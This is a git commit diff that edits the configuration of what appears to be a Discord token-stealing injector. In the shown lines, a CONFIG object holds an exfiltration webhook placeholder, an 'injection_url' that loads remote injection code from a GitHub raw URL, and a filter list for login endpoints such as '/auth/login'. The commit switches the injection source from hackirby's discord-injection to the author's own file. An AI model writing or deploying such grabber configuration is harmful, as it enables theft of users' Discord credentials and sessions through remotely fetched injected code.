dfa0934caa393db5971465b373eecbd44fb68d30
Jowad1 <97253683+Jowad1@users.noreply.github.com>
2025-07-30 07:56:06 -0700

    Update New Text Document.js

--- New Text Document.js
+++ New Text Document.js
@@ -12,7 +12,7 @@ const {
 
 const CONFIG = {
     webhook: "%WEBHOOKHEREBASE64ENCODED%",
-    injection_url: "https://raw.githubusercontent.com/hackirby/discord-injection/main/injection.js",
+    injection_url: "https://raw.githubusercontent.com/Jowad1/sdsdsd/refs/heads/main/New%20Text%20Document.js",
     filters: {
         urls: [
             '/auth/login',
